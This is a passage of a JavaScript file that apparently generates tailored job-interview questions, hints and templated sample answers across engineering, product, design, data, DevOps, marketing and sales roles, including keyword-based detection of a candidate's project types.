      { q:`How do you design a system for ${hasExp ? 'high-traffic' : 'production-level'} scale? Walk me through your approach to system design.`, hint:'Clarify requirements -> estimate scale -> define APIs -> choose data stores -> design for availability/consistency -> identify bottlenecks.', answer:`My approach to system design is always the same sequence. First I clarify requirements and constraints: who are the users, what is the core functionality, what are the read vs write ratios, and what does success look like in terms of latency and availability. Then I estimate scale - orders of magnitude matter, not exact numbers. Next I define the API contracts, because the interface is the most important design decision and everything flows from it. Then I choose data stores matched to access patterns: relational for structured data with complex queries, NoSQL for flexible schemas or horizontal scale, Redis for caching and ephemeral state, a message queue for async workloads. I design for the bottlenecks I expect: a read-heavy system gets caching and read replicas, a write-heavy system gets async processing and sharding. Finally I identify single points of failure and add redundancy. For ${hasExp ? 'production systems' : 'every project'}, I try to keep the initial design as simple as possible and add complexity only where load testing or production data actually shows it is needed.` },
      { q:`You are given a feature request at 4pm on a Friday. How do you decide whether to ship it today or wait?`, hint:'Assess risk, test coverage, rollback plan, business urgency. Show judgement - sometimes the right answer is "wait."', answer:`My default answer is wait - not because I am risk-averse, but because the calculus is usually unfavourable for late-Friday deploys. If something breaks at 7pm on a Friday, I am now debugging a production incident with reduced team availability, no monitoring review time, and high stress. So I ask four questions before shipping. Is there a genuine business need to ship today rather than first thing Monday? Is the change well-tested with a clear rollback path? Is there someone available to monitor it for the first few hours? Has this change been reviewed by at least one other person? If all four are yes, I will ship. If any are no, I wait. The question behind the question is: does the business value of shipping today outweigh the risk of a late-Friday incident? In my experience, the honest answer is rarely yes unless there is a real-time business need - a user-blocking bug, a compliance deadline, a live event. I would rather explain a one-business-day delay than manage a Friday night production fire.` },
      { q:`How do you handle disagreements with a tech lead or architect about a technical decision?`, hint:'Raise concerns with data, propose alternatives in writing, escalate if needed, but commit once a decision is made.', answer:`I raise disagreements directly and early, before decisions are locked in, because that is when they are cheapest to change. I come with specifics: here is the concern, here is the data or reasoning behind it, here is an alternative I am proposing. Writing it down is important - it forces precision and gives the other person time to consider it without the pressure of an immediate verbal response. If they hear my concern and still disagree after good-faith consideration, I probe to understand whether I am missing context they have. Sometimes I am. If after that exchange I still disagree, I will say so clearly and then commit to the decision that was made. Passive resistance - nodding in the meeting and then building something different - is the one thing I do not do. The team needs to move in a direction together. The only exception is genuine ethical or security concerns, where I would escalate formally. But for technical trade-off disagreements, I advocate hard once, then commit.` },
      { q:`What is your approach to estimating the time required for a software task?`, hint:'Break into subtasks, add buffer for unknowns, separate estimate from commitment. Track your estimates vs actuals to improve.', answer:`I estimate by decomposition. I break the work into the smallest subtasks I can identify - each one ideally representable as a day or less of focused work - and estimate each independently. I identify the riskiest and most uncertain subtasks explicitly, because those are where estimates go wrong, and I add explicit investigation time for unknowns before assuming I can build them. I add a buffer of 20-30% on top for integration, testing, and the inevitable unexpected issues that appear in every non-trivial task. I also separate estimate from commitment: an estimate is my best current guess given what I know; a commitment is what I will hold myself to, which incorporates the buffer and the risk factors. I track my estimates versus actuals on significant tasks, which has improved my accuracy significantly over time - I know from historical data that my first estimates tend to underweight integration and testing time in particular. If a task is too uncertain to estimate reliably, I propose a short time-boxed spike to reduce uncertainty first.` },
      { q:`Describe a time you had to make a critical production decision with incomplete information.`, hint:'Show calmness under pressure, structured thinking, communication with stakeholders, and what you would do differently next time.', answer:`${hasExp ? `At ${company0},` : 'During an incident on a live project,'} we had a production service degrading and causing errors for users, and the root cause was not yet clear. I had two options: roll back the last deploy immediately, accepting that the rollback itself might disrupt users, or continue investigating while the errors accumulated. My framework in this situation is always: prefer the reversible action. A rollback is reversible in minutes; waiting while errors accumulate means more impacted users and a potentially harder problem to untangle. I called the rollback, communicated the decision and rationale clearly to the team and stakeholders immediately, and then used the restored stability to diagnose properly. The rollback resolved the issue - the last deploy was the cause. Communicating early and often to stakeholders during incidents is something I am deliberate about, because silence during an outage is interpreted as panic or incompetence regardless of how hard you are working.` },
      { q:`How do you onboard yourself into a new, unfamiliar codebase?`, hint:'Read the README and architecture docs, run it locally, trace a user-facing feature end-to-end, ask for a code tour, small PR first.', answer:`My onboarding process follows a consistent sequence. First I read everything that exists: the README, architecture decision records, API documentation, infrastructure diagrams, recent onboarding docs. Even outdated docs reveal what the system was intended to be. Then I get the system running locally - this surfaces the first set of real friction. Then I trace a single user-facing feature end-to-end through the codebase: from the API endpoint into the service layer, into the database, and back. This gives me a mental map of how the layers connect. I then ask for a code tour from the person who knows the system best - I come with specific questions from my earlier exploration, not generic ones. My first PR is deliberately small and in a non-critical path: fixing a typo, adding a test, improving an error message. It lets me validate my local setup, understand the review process, and build trust before tackling anything significant. I track my questions as I onboard so I can answer them for the next person.` },
      { q:`What is your philosophy on code comments vs. self-documenting code?`, hint:'Code shows what and how; comments should explain why. Name things clearly. Comment non-obvious business logic, workarounds, or gotchas.', answer:`Code should explain what it does through the names of its functions, variables, and types - if you need a comment to explain what a function does, the function probably needs a better name. Comments should explain why: a non-obvious business constraint, a workaround for a third-party library bug with a link to the issue, a performance-critical section that was optimised for a specific reason that the next developer might undo if they do not understand the constraint. What I actively avoid is comments that simply restate the code in plain English - these add noise, go stale, and give a false sense of documentation. I also avoid TODO comments without a ticket reference, because they become permanent if they have no owner. For complex algorithms, a single-line comment explaining the mathematical invariant or the algorithm reference is valuable. For code that looks wrong but is intentional - like a specific ordering or an empty catch block - I always comment to prevent a future maintainer from "fixing" it.` },
      { q:`How do you approach security in your code? Give examples from ${hasExp ? 'your work at ' + company0 : 'your projects'}.`, hint:'OWASP Top 10 awareness, parameterised queries, secrets management, least privilege, input validation, dependency scanning.', answer:`Security is not a phase at the end of development - it is a set of habits at every layer. At the data layer, I always use parameterised queries and never concatenate user input into SQL or shell commands. For secrets, I use environment variables and secret managers - never hardcoded credentials in source code. I validate and sanitise all user input at the boundary, assuming all external input is potentially adversarial. For authentication I use well-established libraries and standards rather than rolling my own - JWTs, OAuth 2.0, bcrypt for password hashing with appropriate work factors. I apply least privilege everywhere: database users have only the permissions they need, AWS IAM roles grant only what is required. ${hasExp ? `At ${company0}, I` : 'I'} run dependency audits regularly with npm audit or similar tools, because outdated dependencies with known CVEs are one of the most common real-world attack vectors. I also include basic security review as part of every code review: checking for any of the OWASP Top 10 patterns in changes that touch user-facing endpoints or data storage.` },
      { q:`${skills.includes('React') || skills.includes('react') ? 'You use React - h' : 'H'}ow do you decide what state goes in the component, what goes in a store, and what gets fetched from the server?`, hint:'Local UI state in component. Shared client state in Zustand/Redux. Server state (cached, async) in React Query/SWR. Separate concerns clearly.', answer:`I think about state in three distinct categories, each with different management strategies. Local UI state - whether a dropdown is open, the current input value in a form field, a hover state - belongs in the component. It is transient, has no value outside the component, and there is no reason to pay the cost of a global store for it. Shared client state - the currently authenticated user, a theme preference, a cart that multiple components read and write - belongs in a lightweight store like Zustand or Jotai. This is true global state: it outlives any single component and needs to be accessible from multiple places without prop drilling. Server state - data fetched from an API that has its own lifecycle of loading, caching, staleness, and invalidation - belongs in a dedicated library like React Query or SWR, not in a store. Stores are not designed for async data with expiry semantics. Using React Query for server state and keeping the store for genuinely shared client state dramatically reduces complexity and eliminates an entire class of cache synchronisation bugs.` },
      { q:`How do you mentor a junior developer and help them grow without creating bottlenecks for yourself?`, hint:'Code reviews as teaching moments, pair programming, delegating with clear scope, letting them make (safe) mistakes.', answer:`The biggest mistake I see in mentoring is doing everything for the junior developer rather than teaching them to do it themselves. My approach is to delegate with clear scope and let them encounter real problems, rather than pre-solving everything. When I give a code review, I do not just mark what needs to change - I explain why, link to resources when relevant, and ask questions that help them reason through the problem. For genuinely novel problems they have not faced before, I pair with them for the first thirty minutes to model the thinking process, then step back and check in later. I also try to identify the type of feedback each person most benefits from at their current stage - early on, architectural thinking matters most; as they advance, the focus shifts to code quality, edge cases, and communication. To avoid creating a bottleneck, I encourage juniors to form opinions first before asking me - "here is what I tried and why, here is where I am stuck" is far more valuable than "I do not know where to start." It makes them more effective and makes our time together more focused.` },
    ].forEach(addRS);
  } else if (isPM) {
    [
      { q:`How do you build and communicate a product roadmap when stakeholder priorities conflict?`, hint:'Align on company strategy first, use data to back prioritisation (RICE/ICE), hold roadmap reviews, say "not now" not "no."' },
      { q:`Walk me through how you would launch a new feature from idea to post-launch measurement.`, hint:'Discovery -> hypothesis -> scope -> design -> build -> staged rollout -> metrics -> iterate. Celebrate learnings, not just launches.' },
      { q:`How do you decide what NOT to build?`, hint:'Opportunity cost framing - every yes is a no to something else. Validate problems before solutions. Kill features that aren\'t working.' },
      { q:`Tell me about a feature you shipped that failed. What did you learn?`, hint:'Shows self-awareness and maturity. Focus on the decision-making process, not just the bad outcome.' },
      { q:`How do you work with engineering teams that think a feature is technically infeasible?`, hint:'Understand the constraint deeply, explore alternative solutions together, adjust scope, build trust over time.' },
      { q:`How do you approach user research with limited time and budget?`, hint:'5-user usability tests, jobs-to-be-done interviews, unmoderated tests (Maze, Loom), mining support tickets and reviews, analytics.' },
      { q:`What metrics would you use to measure the health of ${role ? 'a ' + role + '\'s' : 'your'} product area?`, hint:'Acquisition, activation, retention, revenue, referral (AARRR). Layer with feature-specific metrics. North Star + supporting metrics.' },
      { q:`How do you balance technical debt with new feature development in sprint planning?`, hint:'Negotiate explicit capacity (20-30% for debt), make debt visible and business-impactful, tie it to velocity or reliability metrics.' },
      { q:`Tell me about a time you had to influence a decision without direct authority.`, hint:'Shows communication and persuasion skills. Use data, empathy, and stakeholder mapping. Align on shared goals.' },
      { q:`How do you handle a product area where you have low domain expertise?`, hint:'Intensive customer interviews, shadow support, read competitors, hire/consult domain experts, be transparent about your learning curve.' },
    ].forEach(addRS);
  } else if (isDesign) {
    [
      { q:`Walk me through your end-to-end design process for a complex feature you shipped recently.`, hint:'Discovery -> research -> problem framing -> ideation -> wireframes -> prototype -> testing -> handoff -> feedback loop.' },
      { q:`How do you measure the success of a design decision?`, hint:'Usability metrics (task completion, error rate), business metrics (conversion, retention), qualitative feedback. Set metrics before shipping.' },
      { q:`How do you handle a situation where engineering says your design is too complex to build on time?`, hint:'Understand constraints first (never dismiss them), explore simplification, propose phased delivery, document future state vision.' },
      { q:`Describe a time a usability test completely invalidated your design assumptions.`, hint:'Shows humility and user-centricity. Walk through what you expected, what you found, and how quickly you pivoted.' },
      { q:`How do you design for accessibility, and how do you advocate for it when it is deprioritised?`, hint:'WCAG 2.1 AA at minimum, colour contrast, keyboard navigation, screen reader testing. Frame it as legal risk and larger market reach.' },
      { q:`How do you build and maintain a design system at scale with multiple product teams?`, hint:'Contribution model, governance, versioning, documentation, deprecation process. Trust > compliance - make the right thing easy.' },
      { q:`How do you work with product managers who want to skip the research phase to ship faster?`, hint:'Lightweight research methods (2-day sprints), reuse existing insights, frame research as risk reduction - not a delay.' },
      { q:`Tell me about a design decision you were wrong about, and how you discovered it.`, hint:'Shows intellectual honesty. Great designers recognise design is hypothesis testing, not artistic expression.' },
      { q:`How do you balance consistency with innovation in a mature design system?`, hint:'Extend the system via new components, not exceptions. Audit for debt, run design crits. Innovation at the component level, not by breaking patterns.' },
      { q:`How do you communicate design decisions to an engineering team that does not always read specs?`, hint:'Annotated handoff files, Loom walkthroughs, design review sessions, being present in implementation review, async Q&A in Figma comments.' },
    ].forEach(addRS);
  } else if (isData) {
    [
      { q:`Walk me through an end-to-end analysis project - from business question to actionable recommendation.`, hint:'Define question -> identify data sources -> clean/transform -> explore -> model/analyse -> validate -> communicate findings -> follow up on impact.' },
      { q:`How do you handle missing data in a dataset? What factors influence your imputation strategy?`, hint:'Understand why data is missing (MCAR/MAR/MNAR). Mean/median/mode for small amounts, model-based imputation, or flag as a feature.' },
      { q:`Explain A/B testing. What are the common mistakes teams make in experiment design?`, hint:'Sample size calculation, statistical significance vs practical significance, novelty effect, peeking (stopping early), confounding variables, SRM.' },
      { q:`What is the difference between correlation and causation, and how do you test for causal relationships?`, hint:'Correlation != causation. Causal inference: RCTs (gold standard), difference-in-differences, regression discontinuity, instrumental variables.' },
      { q:`How do you communicate complex analytical findings to a non-technical stakeholder?`, hint:'Lead with the business answer, not the method. Use visualisations. Explain confidence and caveats simply. Prepare for "so what?" questions.' },
      { q:`How would you build a dashboard to track the health of a product feature?`, hint:'Define north star metric + 3-5 supporting metrics, slice by segment, anomaly detection, trend over time, avoid metric overload.' },
      { q:`Walk me through how you would approach building a churn prediction model.`, hint:'Define churn (30/60/90 day), feature engineering (usage, engagement, billing events), model (logistic regression, XGBoost), evaluation (AUC-ROC, recall at k%), deployment.' },
      { q:`What is the difference between a data warehouse, a data lake, and a data lakehouse?`, hint:'Warehouse: structured, SQL, slow ingestion (Redshift, BigQuery). Lake: raw, unstructured, cheap. Lakehouse: lake + table format (Delta, Iceberg) + SQL.' },
      { q:`How do you validate the quality of a dataset before running analysis on it?`, hint:'Row counts, null rates, distribution of key fields, referential integrity, freshness, deduplication, domain-specific checks.' },
      { q:`Describe a time where your analysis led to a business decision you later found out was wrong. How did you handle it?`, hint:'Shows intellectual honesty and resilience. Root cause the error, communicate transparently, fix the process, not just the output.' },
    ].forEach(addRS);
  } else if (isDevOps) {
    [
      { q:`How do you design a CI/CD pipeline for a microservices architecture with 20+ services?`, hint:'Mono vs multi-repo tradeoffs, per-service pipelines, shared library, GitOps (Argo/Flux), canary deployments, automated rollback.' },
      { q:`Explain the difference between blue-green and canary deployments. When do you use each?`, hint:'Blue-green: instant cutover, full duplicate infra cost, easy rollback. Canary: gradual traffic shift, real user validation, slower rollback.' },
      { q:`How do you approach incident response when a production service goes down?`, hint:'On-call -> acknowledge -> triage -> communicate status page -> mitigate (not fix) -> post-mortem -> blameless follow-up actions.' },
      { q:`What is Infrastructure as Code and how do you manage drift between declared and actual state?`, hint:'Terraform/Pulumi/CDK. Drift detection via terraform plan in CI, state locking, import existing resources, avoid manual changes.' },
      { q:`How do you secure a Kubernetes cluster in production?`, hint:'RBAC, network policies, pod security standards, image scanning (Trivy), secret management (Vault/ESO), runtime security (Falco), admission controllers.' },
      { q:`Explain SRE principles. What is an error budget and how do you use it to balance reliability and velocity?`, hint:'SLI (indicator) -> SLO (objective) -> error budget (1 - SLO). If budget is burning fast, slow down feature work. If budget is healthy, ship faster.' },
      { q:`How do you monitor and alert on a distributed system without alert fatigue?`, hint:'Alert on SLOs, not symptoms. Symptom-based alerting reduces noise. Correlate metrics/logs/traces. Tiered alerts: page vs ticket vs dashboard.' },
    ].forEach(addRS);
  } else if (isMktg) {
    [
      { q:`How do you build a go-to-market strategy for a new product with a limited budget?`, hint:'ICP definition, channel prioritisation (where does your buyer live?), messaging testing, paid vs organic balance, referral loops.' },
      { q:`How do you measure the ROI of a marketing campaign accurately?`, hint:'Attribution models (first-touch, last-touch, linear, data-driven), CAC, LTV, payback period, control groups for incrementality testing.' },
      { q:`Describe your approach to SEO - both on-page and off-page.`, hint:'Technical SEO (crawlability, Core Web Vitals), content strategy (search intent), link building (earned, not bought), E-E-A-T signals.' },
      { q:`How do you build a content strategy that drives both traffic and conversions?`, hint:'Keyword research aligned to buyer journey, pillar + cluster model, CTA optimisation, content decay audits, repurposing across channels.' },
      { q:`Tell me about a campaign that did not perform as expected. What did you learn?`, hint:'Shows analytical rigour. Root cause analysis, hypothesis testing, what you changed, and whether the next iteration validated your learning.' },
    ].forEach(addRS);
  } else if (isSales) {
    [
      { q:`Walk me through your sales process from first contact to closed deal.`, hint:'Prospecting -> qualify (BANT/MEDDIC) -> discovery -> demo/proposal -> objections -> negotiation -> close -> handoff. Tailor to deal size.' },
      { q:`How do you handle a prospect who goes silent after a strong initial meeting?`, hint:'Persistence with value (not just "checking in"), multi-channel follow-up, time-boxed last-attempt, understand what changed.' },
      { q:`Tell me about your largest deal. How did you navigate the decision-making process?`, hint:'Multi-stakeholder alignment, champion development, economic buyer access, procurement/legal navigation, competitive differentiation.' },
      { q:`How do you build trust with a sceptical buyer who has been burned by a competitor?`, hint:'Listen first, validate their experience, lead with proof (case studies, trial, references), set realistic expectations, under-promise and over-deliver.' },
      { q:`How do you manage a pipeline that is at risk of missing quota?`, hint:'Audit each deal for stall reasons, focus effort on highest-probability deals, accelerate mid-funnel with business case, bring in SE or manager.' },
    ].forEach(addRS);
  }

  // Fallback role-specific if nothing matched
  if (!roleSpecific.length) {
    [
      { q:`How does your experience in ${role || 'your previous roles'} directly prepare you for the challenges of this position?`, hint:`Map your specific skills (${skillList}) and experiences to the job description. Don't be generic - be specific and quantified.` },
      { q:`What are the biggest challenges facing ${role ? role + 's' : 'professionals in your field'} in the next 2-3 years?`, hint:'Shows industry awareness and forward thinking. Research current trends - AI/automation, regulation, market shifts in your space.' },
      { q:`What is something about ${role ? 'the ' + role + ' role' : 'your field'} that most people outside it fundamentally misunderstand?`, hint:'Shows depth of expertise and the ability to educate non-specialists. Pick something real, not a clichÃ©.' },
      { q:`How do you build credibility and trust quickly when starting at a new company in your field?`, hint:'Listen before speaking, deliver small wins fast, learn the culture, understand stakeholders\' goals before pushing your own agenda.' },
      { q:`Describe the most significant professional growth you have experienced in the past two years.`, hint:'Show self-awareness and progression. Tie the growth to something measurable in your work - better results, new responsibilities, wider scope.' },
    ].forEach(addRS);
  }

  // ---------------------------------------------------------------------
  // PROJECT-BASED  (7+ questions)
  // ---------------------------------------------------------------------
  const projectQs = [];
  proj.forEach((pr, idx) => {
    // Detect project type from name + description + bullets
    const projText = [pr.name, pr.description || '', ...(pr.bullets || [])].join(' ').toLowerCase();
    const isMLProj        = /\b(machine.learning|deep.learning|neural|predict|classif|regress|nlp|computer.vision|tensorflow|pytorch|scikit|sklearn|random.forest|fraud.detect|recommend|sentiment|dataset|accuracy|f1.score|epoch|training.data|opencv|yolo|bert|transformer|ai.project|artificial.intel)\b/.test(projText);
    const isEcommerceProj = /\b(e.?commerce|shopping|cart|checkout|payment|order|product.catalog|inventory|marketplace|stripe|razorpay|paypal|merchant|purchase|wishlist)\b/.test(projText);
    const isSecurityProj  = /\b(security|cyber|pentest|vulnerab|encrypt|xss|sql.inject|firewall|intrusion|siem|threat|malware|ctf|penetration|owasp|zero.day)\b/.test(projText);
    const isHealthProj    = /\b(health|medical|hospital|patient|doctor|clinic|telemedicine|diagnos|symptom|medicine|pharmacy|appointment)\b/.test(projText);
    const isFinanceProj   = /\b(financ|fintech|bank|trading|stock|investment|loan|credit|fraud|transaction|blockchain|crypto|wallet|insurance|ledger)\b/.test(projText);
    const isRealTimeProj  = /\b(real.time|websocket|chat|messag|notification|streaming|live stream|socket\.io|event.driven|kafka|pub.sub|signalr)\b/.test(projText);
    const isMobileProj    = /\b(android|ios|mobile.app|flutter|react.native|kotlin|swift|app.store|play.store|apk|expo)\b/.test(projText);
    const isSafetyProj    = /\b(safety|sos|emergency.alert|women.safety|welfare|rescue.app)\b/.test(projText);

    // Domain-specific questions per detected project type
    const typeQs = [];
    if (isMLProj) typeQs.push(
      { q:`What ML model did you choose for "${pr.name}" and why? What alternatives did you evaluate?`, hint:'Model selection rationale: accuracy, interpretability, training data size, inference speed, class imbalance handling. Explain what you benchmarked.' },
      { q:`How did you evaluate the "${pr.name}" model's performance? What metrics did you use and how did you handle class imbalance?`, hint:'Precision, recall, F1, AUC-ROC vs accuracy. Confusion matrix. SMOTE / class weights. Business cost of false positives vs false negatives.' },
      { q:`How did you prepare and clean the dataset for "${pr.name}"? What data quality issues did you encounter?`, hint:'Missing values, outliers, feature scaling, train/val/test split ratios, preventing data leakage. Describe real challenges you faced.' },
    );
    if (isEcommerceProj) typeQs.push(
      { q:`How did you prevent overselling and handle concurrent inventory updates in "${pr.name}"?`, hint:'Database transactions, optimistic/pessimistic locking, inventory reservation pattern, race condition scenarios.' },
      { q:`How did you integrate the payment gateway in "${pr.name}"? How did you handle payment failures and partial transaction scenarios?`, hint:'Webhook handling for async confirmation, idempotency keys, rollback on failure, test vs live mode, PCI DSS awareness.' },
      { q:`How did you design product search and filtering in "${pr.name}" for both performance and relevance?`, hint:'Full-text search approach, database indexes, faceted filtering, pagination strategy, relevance ranking.' },
    );
    if (isSecurityProj) typeQs.push(
      { q:`What threat modelling did you perform for "${pr.name}"? What attack vectors did you identify?`, hint:'STRIDE/OWASP threat modelling. Common vectors: injection, broken auth, IDOR, sensitive data exposure. What was highest risk?' },
      { q:`Walk me through the most significant vulnerability you found or fixed in "${pr.name}". How did you discover and remediate it?`, hint:'Discovery method (manual review, scanning, testing), technical root cause, fix implementation, validation that it was resolved.' },
      { q:`How did you implement authentication and authorisation in "${pr.name}"? What security standards guided your choices?`, hint:'JWT/session security, bcrypt for passwords, MFA consideration, RBAC design, principle of least privilege, OWASP guidelines.' },
    );
    if (isHealthProj) typeQs.push(
      { q:`How did you handle patient data privacy and compliance requirements in "${pr.name}"?`, hint:'Relevant data protection regulations (HIPAA or local equivalent), encryption at rest and in transit, access logging, data minimisation.' },
      { q:`What accuracy and reliability standards did you set for "${pr.name}", and how did you validate them against edge cases?`, hint:'In healthcare false negatives and positives have different consequences. Discuss validation methodology and acceptable error thresholds.' },
    );
    if (isFinanceProj) typeQs.push(
      { q:`How did you ensure transaction integrity and prevent data inconsistency in "${pr.name}"?`, hint:'ACID transactions, idempotency keys, double-entry principles, reconciliation logic, handling partial failures.' },
      { q:`What fraud detection or abuse prevention mechanisms did you build into "${pr.name}"?`, hint:'Rule-based detection, velocity checks, anomaly scoring, IP/device signals, ML-based risk scoring.' },
    );
    if (isRealTimeProj) typeQs.push(
      { q:`How did you implement real-time communication in "${pr.name}"? How did you handle connection drops and message delivery guarantees?`, hint:'WebSockets vs SSE vs polling tradeoffs, reconnection strategy, at-least-once vs exactly-once delivery, backpressure handling.' },
      { q:`How did you scale the real-time features in "${pr.name}" to handle multiple concurrent users?`, hint:'Horizontal scaling WebSocket servers requires shared state - Redis pub/sub, sticky sessions, or a message broker.' },
    );
    if (isMobileProj) typeQs.push(
      { q:`How did you handle offline functionality and data synchronisation in "${pr.name}"?`, hint:'Local storage choices (SQLite, AsyncStorage), sync strategy on reconnect, conflict resolution, optimistic UI updates.' },
      { q:`How did you optimise battery consumption and rendering performance in "${pr.name}"?`, hint:'Background processing limits, efficient list rendering (FlatList), image caching, minimising re-renders, profiling results.' },
    );
    if (isSafetyProj) typeQs.push(
      { q:`What reliability and availability requirements did you set for "${pr.name}"'s critical safety features, and how did you meet them?`, hint:'Safety features must work under poor connectivity, low battery, and stress. Fallback mechanisms, offline mode, testing edge cases.' },
      { q:`How did you balance user privacy with the location or data tracking that "${pr.name}" requires to function?`, hint:'Minimum data collection, explicit consent, secure transmission and storage of location data, data deletion capability.' },
    );

    projectQs.push(
      { q:`Walk me through "${pr.name}" - what problem it solved, the approach you took, and the measurable outcome.`, hint:'STAR method. Lead with the impact: users helped, time saved, revenue generated, performance improved. Numbers first.' },
      { q:`What was the most difficult technical or design challenge you faced while building "${pr.name}", and how did you solve it?`, hint:'Interviewers want to see depth of thinking - the tradeoffs you considered, alternatives you rejected, and why you chose what you did.' },
      { q:`If you were to rebuild "${pr.name}" from scratch today, what would you do differently?`, hint:'Honest self-reflection on architecture, tooling, or process choices. Shows growth and maturity - not that you regret it, but that you learned.' },
      ...typeQs.slice(0, 3),
      ...(idx === 0 ? [
        { q:`How did you decide on the tech stack for "${pr.name}"? What tradeoffs did you consider?`, hint:'Shows engineering judgement. Discuss performance, team familiarity, ecosystem maturity, scalability needs vs development speed.' },
        { q:`What would it take to scale "${pr.name}" from its current state to 10x or 100x its current usage?`, hint:'Identify the bottlenecks: database, caching, horizontal scaling, async processing, CDN. Show systems thinking.' },
        { q:`How did you test "${pr.name}"? What was your approach to quality assurance?`, hint:'Unit tests, integration tests, manual testing, performance benchmarks, security review. Be honest about gaps and what you would add now.' },
        { q:`How did you handle security considerations in "${pr.name}"? What vulnerabilities did you protect against?`, hint:'Authentication, authorisation, input validation, SQL injection, XSS, secrets management, dependency auditing - pick the most relevant.' },
      ] : []),
    );
  });

  if (projectQs.length < 7 && hasExp) {
    const remaining = 7 - projectQs.length;
    const expQs = [
      { q:`Describe the most impactful project you delivered at ${company0}. What was your specific contribution and the measurable outcome?`, hint:"Focus exclusively on YOUR contribution - not the team's. Use 'I' not 'we' when describing what you personally did." },
      { q:`Walk me through a significant technical decision you made at ${company0} and the long-term consequences of that choice.`, hint:'Architecture decisions, technology choices, process changes. Discuss downstream effects - positive and negative.' },
      { q:`Tell me about a project at ${company0} that was cancelled or failed. What happened and what did you learn?`, hint:'Shows maturity and honesty. Focus on systemic learning, not blame. What would you flag earlier next time?' },
      { q:`How did you collaborate with ${company1 ? company0 + ' and ' + company1 : 'cross-functional teams'} to deliver a complex project?`, hint:'Stakeholder management, communication cadence, conflict resolution, documentation, shared definition of done.' },
      { q:`What is the highest-stakes project you have owned end-to-end? How did you manage the complexity?`, hint:'Scope management, risk identification, communication plan, escalation path, retrospective learnings.' },
      { q:`Describe a time you had to push back on a project requirement. How did you frame the conversation?`, hint:'Data-backed pushback, alternative proposals, framing it as serving the user/business goal better - not personal resistance.' },
      { q:`Tell me about a time you had to learn something completely new mid-project with no support available.`, hint:'Shows self-sufficiency and resilience. Describe the resources you used, how long it took, and the result you achieved.' },
    ];
    expQs.slice(0, remaining).forEach(q => projectQs.push(q));
  }

  if (projectQs.length < 7) {
    [
      { q:`Describe the most ambitious project you have built, even if it was a personal or academic one.`, hint:'Show scope, complexity, and what it required of you. Interviewers care about ambition and ownership, not just polish.' },
      { q:`Tell me about a project where the requirements changed significantly mid-way through. How did you adapt?`, hint:'Agility and communication skills. Show you can re-scope without losing momentum or morale.' },
      { q:`What is a project you deliberately built to learn something new, and what did you take away from it?`, hint:'Side projects signal genuine passion for the craft. Even failed experiments are valuable - show what you would do differently.' },
      { q:`How do you document your projects so that someone else could maintain them without your help?`, hint:'README, architecture diagrams, ADRs, inline comments for non-obvious logic, setup scripts. Good documentation is a professional signal.' },
    ].forEach(q => { if (projectQs.length < 7) projectQs.push(q); });
  }

  // ---------------------------------------------------------------------
  // SITUATIONAL / BEHAVIOURAL  (12 questions)
  // ---------------------------------------------------------------------
  const situational = [
    { q:'Tell me about a time you disagreed strongly with a decision made by your team or manager. What did you do?', hint:'Shows courage and professional maturity. Raise concerns with data, propose alternatives, commit once a decision is made, no passive resistance.', answer:`${hasExp ? `At ${company0}, my team` : 'My team'} was planning to proceed with a technical approach I believed would create significant performance problems at scale. I felt strongly enough that I raised the concern directly with my manager - but I came prepared. I pulled together data: a quick load test simulation, a comparison of similar systems, and a rough estimate of the engineering cost to fix it later versus addressing it now. I proposed a concrete alternative with a two-day spike to validate it. My manager appreciated the structured pushback and we ran the spike. It confirmed the concern, and we switched approaches before too much was built. Once the decision was made, I committed to it fully and helped the team execute. The lesson I took from that experience is that the way you disagree matters as much as whether you are right - data, respect, and a genuine alternative are far more persuasive than just voicing discomfort.` },
    { q:'Describe a time you took full ownership of a problem that was not technically your responsibility.', hint:'Ownership and initiative are top signals for high performers. Show you saw a gap and filled it - and the impact of doing so.', answer:`${hasExp ? `While working at ${company0},` : 'During a team project,'} I noticed our deployment process was causing recurring friction - builds were failing silently in a way that only showed up in production, and the team responsible for the pipeline was overloaded with higher-priority work. Technically it was not my area, but every time it failed, it blocked my work and the team's progress. I decided to dig into it on my own time, identified three configuration issues causing the silent failures, and submitted a fix along with a clear explanation and a runbook for next time. The problem stopped recurring. What I learned from this is that "not my responsibility" is often how problems persist - someone has to care enough to close the gap. I am someone who finds it easier to fix the problem than to wait for someone else to.` },
    { q:'Give me an example of a time you failed significantly. What exactly went wrong and what changed after?', hint:'Interviewers expect and respect honest answers. Focus 20% on the failure, 80% on the learning and the systemic change you made.', answer:`${hasExp ? `Early in my time at ${company0},` : 'In one of my projects,'} I significantly underestimated the scope of a feature I had committed to. I had given a timeline based on the happy path without accounting for edge cases, integration complexity, and testing. As the deadline approached, it became clear I was not going to make it - but I held on too long hoping to catch up before raising the flag. When I finally communicated the delay, it had downstream consequences for other teams who were blocked on my work. The failure had two parts: the estimation error and the delayed communication. After that, I changed two things: I now break every estimate into explicit subtasks with individual time estimates and a buffer for unknowns, and I set a personal rule to escalate any risk of a schedule slip the moment I see it, not when I am certain. I have not missed a committed deadline since.` },
    { q:`Tell me about a time you had to work with someone whose ${isFresher ? 'academic or project' : 'work'} style was very different from yours.`, hint:'Empathy and adaptability. Show you adapted YOUR approach, not that you changed them or avoided them.', answer:`${hasExp ? 'I once collaborated closely with a colleague whose approach was very different from mine.' : 'I once worked closely with a teammate whose style was very different from mine.'} They preferred to work through things verbally - thinking out loud in long meetings before making decisions. My natural preference is to think asynchronously, write things down, and come to discussions with a structured proposal. Initially I found our work rhythm frustrating; I felt the meetings were inefficient and they found my written-first approach cold. I decided to adapt rather than waiting for them to. I started making time for a quick verbal alignment call before sending written proposals, and I explicitly asked them to share rough thoughts rather than waiting for them to be polished. Once I understood how they processed information, collaboration became significantly smoother. The outcome was genuinely better work - their verbal exploration surfaced edge cases my written thinking had missed. I now try to learn how someone thinks before defaulting to my own communication preferences.` },
    { q:`Describe a situation where you had to deliver bad news to a stakeholder or manager.`, hint:'Timeliness, clarity, ownership of the bad news, and a recovery plan. Burying bad news is far worse than delivering it early.', answer:`${hasExp ? `At ${company0},` : 'On a project I was deeply involved in,'} I discovered mid-implementation that the approach we had committed to a key stakeholder was going to require significantly more time than originally estimated - the data model was more complex than we had anticipated during planning. I did not wait for the deadline to pass. I scheduled a call the same day I confirmed the issue, came prepared with a clear explanation of why the original estimate was wrong, two options for moving forward with rough trade-offs, and my recommendation. The stakeholder was understandably frustrated, but they respected that I had surfaced it early and come with options rather than just problems. We adjusted the delivery plan, and the final outcome was positive. What I took from that experience is that delivering bad news early is almost always better than delivering it late - the problem does not get smaller by waiting, but the trust damage does.` },
